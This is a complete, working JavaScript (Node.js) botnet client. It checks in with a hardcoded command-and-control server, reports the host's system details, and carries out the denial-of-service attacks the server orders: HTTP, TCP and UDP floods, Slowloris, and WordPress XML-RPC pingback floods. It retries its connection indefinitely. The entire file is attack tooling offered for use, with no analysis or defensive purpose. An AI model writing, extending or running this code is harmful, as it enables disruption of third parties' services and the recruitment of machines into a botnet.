/**
 * =====================================================
 * JAVASCRIPT BOT CLIENT - FULL FEATURED C2 CLIENT
 * =====================================================
 * Features:
 * - HTTP Flood (GET/POST/HEAD)
 * - TCP Flood
 * - UDP Flood
 * - Slowloris Attack
 * - WordPress XML-RPC Attack
 * - Auto-reconnect
 * - Multi-threaded attacks
 * - Stop all attacks
 * - Ping/Sysinfo commands
 * =====================================================
 */

const axios = require('axios');
const os = require('os');
const crypto = require('crypto');
const net = require('net');
const dgram = require('dgram');
const { URL } = require('url');

// ==================== CONFIGURATION ====================
const CONFIG = {
    SERVER_URL: 'https://c2-server-io.onrender.com', // Change this to your C2 server URL
    CHECK_INTERVAL: 2000, // Check for commands every 2 seconds
    HEARTBEAT_INTERVAL: 10000, // Send heartbeat every 10 seconds
    RECONNECT_DELAY: 5000, // Reconnect delay on failure
    MAX_RETRIES: 999999 // Infinite retries
};

// ==================== BOT STATE ====================
class BotClient {
    constructor() {
        this.botId = `JS-${crypto.randomBytes(4).toString('hex')}`;
        this.isApproved = false;
        this.isRunning = false;
        this.activeAttacks = [];
        this.attackThreads = new Map();
        this.retryCount = 0;
        
        console.log(`[+] Bot initialized: ${this.botId}`);
        console.log(`[+] Server: ${CONFIG.SERVER_URL}`);
    }

    // ==================== SYSTEM INFO ====================
    getSystemSpecs() {
        return {
            cpu_cores: os.cpus().length,
            ram_gb: (os.totalmem() / (1024 ** 3)).toFixed(2),
            os: `${os.type()} ${os.release()}`,
            platform: os.platform(),
            arch: os.arch(),
            hostname: os.hostname(),
            client_type: 'javascript',
            user_agent: 'JavaScript-Bot/2.0 (Node.js)',
            capabilities: {
                javascript: true,
                http_flood: true,
                tcp_flood: true,
                udp_flood: true,
                slowloris: true,
                wordpress_xmlrpc: true
            }
        };
    }

    // ==================== SERVER COMMUNICATION ====================
    async checkApproval() {
        try {
            const response = await axios.post(`${CONFIG.SERVER_URL}/check_approval`, {
                bot_id: this.botId,
                specs: this.getSystemSpecs()
            }, {
                timeout: 10000,
                headers: { 'Content-Type': 'application/json' }
            });

            if (response.data.approved) {
                this.isApproved = true;
                this.retryCount = 0;
                console.log(`[+] Bot approved by C2 server!`);
                return true;
            }
            return false;
        } catch (error) {
            console.error(`[!] Approval check failed: ${error.message}`);
            return false;
        }
    }

    async getCommands() {
        if (!this.isApproved) return [];

        try {
            const response = await axios.get(`${CONFIG.SERVER_URL}/commands/${this.botId}`, {
                timeout: 10000
            });
            return response.data.commands || [];
        } catch (error) {
            console.error(`[!] Failed to get commands: ${error.message}`);
            return [];
        }
    }

    async sendStatus(status, message) {
        if (!this.isApproved) return;

        try {
            await axios.post(`${CONFIG.SERVER_URL}/status`, {
                bot_id: this.botId,
                status: status,
                message: message,
                stats: {
                    active_attacks: this.activeAttacks.length,
                    uptime: process.uptime()
                }
            }, {
                timeout: 5000,
                headers: { 'Content-Type': 'application/json' }
            });
        } catch (error) {
            console.error(`[!] Failed to send status: ${error.message}`);
        }
    }

    // ==================== HTTP FLOOD ATTACK ====================
    async httpFlood(target, duration, threads, method, userAgents) {
        const attackId = crypto.randomBytes(4).toString('hex');
        this.activeAttacks.push(attackId);
        
        console.log(`[+] Starting HTTP ${method} flood: ${target}`);
        console.log(`[+] Threads: ${threads} | Duration: ${duration}s`);
        
        await this.sendStatus('running', `HTTP ${method} flood active on ${target}`);

        const endTime = Date.now() + (duration * 1000);
        const attackPromises = [];

        for (let i = 0; i < threads; i++) {
            const promise = (async () => {
                let requests = 0;
                while (Date.now() < endTime && this.activeAttacks.includes(attackId)) {
                    try {
                        const headers = {
                            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                            'Accept': '*/*',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Connection': 'keep-alive',
                            'Cache-Control': 'no-cache'
                        };

                        if (method === 'GET') {
                            await axios.get(target, { headers, timeout: 5000 });
                        } else if (method === 'POST') {
                            await axios.post(target, { data: crypto.randomBytes(1024).toString('hex') }, { headers, timeout: 5000 });
                        } else if (method === 'HEAD') {
                            await axios.head(target, { headers, timeout: 5000 });
                        }

                        requests++;
                    } catch (err) {
                        // Ignore errors and continue flooding
                    }
                }
                return requests;
            })();
            attackPromises.push(promise);
        }

        const results = await Promise.all(attackPromises);
        const totalRequests = results.reduce((a, b) => a + b, 0);

        this.activeAttacks = this.activeAttacks.filter(id => id !== attackId);
        console.log(`[+] HTTP flood completed: ${totalRequests} requests sent`);
        await this.sendStatus('idle', `HTTP flood completed: ${totalRequests} requests`);
    }

    // ==================== TCP FLOOD ATTACK ====================
    async tcpFlood(target, duration, threads) {
        const attackId = crypto.randomBytes(4).toString('hex');
        this.activeAttacks.push(attackId);

        const [host, port] = target.split(':');
        console.log(`[+] Starting TCP flood: ${host}:${port}`);
        console.log(`[+] Threads: ${threads} | Duration: ${duration}s`);

        await this.sendStatus('running', `TCP flood active on ${target}`);

        const endTime = Date.now() + (duration * 1000);
        const attackPromises = [];

        for (let i = 0; i < threads; i++) {
            const promise = (async () => {
                let connections = 0;
                while (Date.now() < endTime && this.activeAttacks.includes(attackId)) {
                    try {
                        const socket = new net.Socket();
                        socket.connect(parseInt(port), host, () => {
                            const data = crypto.randomBytes(1024);
                            socket.write(data);
                            connections++;
                            socket.destroy();
                        });
                        socket.on('error', () => socket.destroy());
                        socket.setTimeout(2000, () => socket.destroy());
                    } catch (err) {
                        // Continue
                    }
                    await new Promise(resolve => setTimeout(resolve, 10));
                }
                return connections;
            })();
            attackPromises.push(promise);
        }

        const results = await Promise.all(attackPromises);
        const totalConnections = results.reduce((a, b) => a + b, 0);

        this.activeAttacks = this.activeAttacks.filter(id => id !== attackId);
        console.log(`[+] TCP flood completed: ${totalConnections} connections`);
        await this.sendStatus('idle', `TCP flood completed: ${totalConnections} connections`);
    }

    // ==================== UDP FLOOD ATTACK ====================
    async udpFlood(target, duration, threads) {
        const attackId = crypto.randomBytes(4).toString('hex');
        this.activeAttacks.push(attackId);

        const [host, port] = target.split(':');
        console.log(`[+] Starting UDP flood: ${host}:${port}`);
        console.log(`[+] Threads: ${threads} | Duration: ${duration}s`);

        await this.sendStatus('running', `UDP flood active on ${target}`);

        const endTime = Date.now() + (duration * 1000);
        const attackPromises = [];

        for (let i = 0; i < threads; i++) {
            const promise = (async () => {
                const client = dgram.createSocket('udp4');
                let packets = 0;

                while (Date.now() < endTime && this.activeAttacks.includes(attackId)) {
                    try {
                        const message = crypto.randomBytes(1024);
                        client.send(message, 0, message.length, parseInt(port), host);
                        packets++;
                    } catch (err) {
                        // Continue
                    }
                    await new Promise(resolve => setTimeout(resolve, 1));
                }

                client.close();
                return packets;
            })();
            attackPromises.push(promise);
        }

        const results = await Promise.all(attackPromises);
        const totalPackets = results.reduce((a, b) => a + b, 0);

        this.activeAttacks = this.activeAttacks.filter(id => id !== attackId);
        console.log(`[+] UDP flood completed: ${totalPackets} packets`);
        await this.sendStatus('idle', `UDP flood completed: ${totalPackets} packets`);
    }

    // ==================== SLOWLORIS ATTACK ====================
    async slowloris(target, connections, duration) {
        const attackId = crypto.randomBytes(4).toString('hex');
        this.activeAttacks.push(attackId);

        console.log(`[+] Starting Slowloris: ${target}`);
        console.log(`[+] Connections: ${connections} | Duration: ${duration}s`);

        await this.sendStatus('running', `Slowloris active on ${target}`);

        const url = new URL(target);
        const endTime = Date.now() + (duration * 1000);
        const sockets = [];

        // Create initial connections
        for (let i = 0; i < connections && this.activeAttacks.includes(attackId); i++) {
            try {
                const socket = new net.Socket();
                socket.connect(url.port || 80, url.hostname, () => {
                    socket.write(`GET ${url.pathname || '/'} HTTP/1.1\r\n`);
                    socket.write(`Host: ${url.hostname}\r\n`);
                    socket.write(`User-Agent: Mozilla/5.0\r\n`);
                    socket.write(`Accept: */*\r\n`);
                });
                socket.on('error', () => {});
                sockets.push(socket);
            } catch (err) {
                // Continue
            }
        }

        // Keep connections alive
        const keepAlive = setInterval(() => {
            if (Date.now() >= endTime || !this.activeAttacks.includes(attackId)) {
                clearInterval(keepAlive);
                sockets.forEach(s => s.destroy());
                return;
            }

            sockets.forEach(socket => {
                try {
                    socket.write(`X-a: ${Math.random()}\r\n`);
                } catch (err) {
                    // Ignore
                }
            });
        }, 5000);

        await new Promise(resolve => setTimeout(resolve, duration * 1000));
        clearInterval(keepAlive);
        sockets.forEach(s => s.destroy());

        this.activeAttacks = this.activeAttacks.filter(id => id !== attackId);
        console.log(`[+] Slowloris completed`);
        await this.sendStatus('idle', 'Slowloris attack completed');
    }

    // ==================== WORDPRESS XML-RPC ATTACK ====================
    async wordpressXmlrpc(target, threads, duration) {
        const attackId = crypto.randomBytes(4).toString('hex');
        this.activeAttacks.push(attackId);

        const xmlrpcUrl = target.endsWith('/') ? `${target}xmlrpc.php` : `${target}/xmlrpc.php`;
        console.log(`[+] Starting WordPress XML-RPC: ${xmlrpcUrl}`);
        console.log(`[+] Threads: ${threads} | Duration: ${duration}s`);

        await this.sendStatus('running', `WordPress attack active on ${target}`);

        const endTime = Date.now() + (duration * 1000);
        const attackPromises = [];

        const xmlPayload = `<?xml version="1.0"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>${target}</string></value></param>
<param><value><string>${target}</string></value></param>
</params>
</methodCall>`;

        for (let i = 0; i < threads; i++) {
            const promise = (async () => {
                let requests = 0;
                while (Date.now() < endTime && this.activeAttacks.includes(attackId)) {
                    try {
                        await axios.post(xmlrpcUrl, xmlPayload, {
                            headers: {
                                'Content-Type': 'text/xml',
                                'User-Agent': 'Mozilla/5.0'
                            },
                            timeout: 5000
                        });
                        requests++;
                    } catch (err) {
                        // Continue
                    }
                }
                return requests;
            })();
            attackPromises.push(promise);
        }

        const results = await Promise.all(attackPromises);
        const totalRequests = results.reduce((a, b) => a + b, 0);

        this.activeAttacks = this.activeAttacks.filter(id => id !== attackId);
        console.log(`[+] WordPress attack completed: ${totalRequests} requests`);
        await this.sendStatus('idle', `WordPress attack completed: ${totalRequests} requests`);
    }

    // ==================== COMMAND HANDLER ====================
    async handleCommand(command) {
        console.log(`[>] Received command: ${command.type}`);

        try {
            switch (command.type) {
                case 'ping':
                    console.log('[+] PONG!');
                    await this.sendStatus('idle', 'PONG');
                    break;

                case 'sysinfo':
                    const specs = this.getSystemSpecs();
                    console.log('[+] Sending system info');
                    await this.sendStatus('idle', JSON.stringify(specs));
                    break;

                case 'stop_all':
                    console.log('[!] Stopping all attacks');
                    this.activeAttacks = [];
                    await this.sendStatus('idle', 'All attacks stopped');
                    break;

                case 'http_flood':
                    await this.httpFlood(
                        command.target,
                        command.duration,
                        command.threads,
                        command.method,
                        command.user_agents || ['Mozilla/5.0']
                    );
                    break;

                case 'tcp_flood':
                    await this.tcpFlood(
                        command.target,
                        command.duration,
                        command.threads
                    );
                    break;

                case 'udp_flood':
                    await this.udpFlood(
                        command.target,
                        command.duration,
                        command.threads
                    );
                    break;

                case 'slowloris':
                    await this.slowloris(
                        command.target,
                        command.connections,
                        command.duration
                    );
                    break;

                case 'wordpress_xmlrpc':
                    await this.wordpressXmlrpc(
                        command.target,
                        command.threads,
                        command.duration
                    );
                    break;

                default:
                    console.log(`[!] Unknown command: ${command.type}`);
            }
        } catch (error) {
            console.error(`[!] Command execution error: ${error.message}`);
            await this.sendStatus('error', `Command failed: ${error.message}`);
        }
    }

    // ==================== MAIN LOOP ====================
    async commandLoop() {
        while (this.isRunning) {
            try {
                const commands = await this.getCommands();
                
                if (commands.length > 0) {
                    console.log(`[+] Received ${commands.length} command(s)`);
                    for (const command of commands) {
                        // Execute commands in parallel if possible
                        this.handleCommand(command);
                    }
                }
            } catch (error) {
                console.error(`[!] Command loop error: ${error.message}`);
            }

            await new Promise(resolve => setTimeout(resolve, CONFIG.CHECK_INTERVAL));
        }
    }

    // ==================== START BOT ====================
    async start() {
        console.log('\n' + '='.repeat(50));
        console.log('  JAVASCRIPT BOT CLIENT - STARTING');
        console.log('='.repeat(50));

        while (this.retryCount < CONFIG.MAX_RETRIES) {
            try {
                console.log(`\n[*] Connecting to C2 server...`);
                
                const approved = await this.checkApproval();
                
                if (approved) {
                    this.isRunning = true;
                    console.log('[+] Connected! Waiting for commands...\n');
                    await this.commandLoop();
                } else {
                    throw new Error('Not approved');
                }
            } catch (error) {
                this.retryCount++;
                console.error(`[!] Connection failed: ${error.message}`);
                console.log(`[*] Retrying in ${CONFIG.RECONNECT_DELAY / 1000}s... (${this.retryCount}/${CONFIG.MAX_RETRIES})`);
                
                this.isRunning = false;
                this.isApproved = false;
                
                await new Promise(resolve => setTimeout(resolve, CONFIG.RECONNECT_DELAY));
            }
        }

        console.log('[!] Max retries reached. Exiting...');
    }

    // ==================== SHUTDOWN ====================
    async shutdown() {
        console.log('\n[!] Shutting down bot...');
        this.isRunning = false;
        this.activeAttacks = [];
        await this.sendStatus('disconnected', 'Bot shutting down');
        console.log('[+] Goodbye!');
        process.exit(0);
    }
}

// ==================== MAIN EXECUTION ====================
const bot = new BotClient();

// Handle graceful shutdown
process.on('SIGINT', () => bot.shutdown());
process.on('SIGTERM', () => bot.shutdown());

// Start the bot
bot.start().catch(error => {
    console.error(`[!] Fatal error: ${error.message}`);
    process.exit(1);
});

// Keep process alive
process.on('uncaughtException', (error) => {
    console.error(`[!] Uncaught exception: ${error.message}`);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error(`[!] Unhandled rejection at: ${promise}, reason: ${reason}`);
});
